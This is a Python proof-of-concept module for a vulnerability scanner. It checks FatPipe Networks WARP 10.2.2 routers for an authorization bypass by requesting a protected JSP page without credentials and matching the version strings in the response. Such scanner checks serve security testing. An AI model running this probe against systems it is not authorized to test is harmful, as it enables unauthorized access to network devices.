import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''FatPipe Networks WARP 10.2.2 Authorization Bypass''',
        "description": '''Improper access control occurs when the application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources behind protected pages.''',
        "severity": "high",
        "references": [
            "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5682.php", 
            "https://www.fatpipeinc.com/support/advisories.php"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["fatpipe", "auth-bypass", "router"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/fpui/jsp/index.jsp"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""productType""" in resp0.text and """type:""" in resp0.text and """version:""" in resp0.text and """<title>FatPipe Networks</title>""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url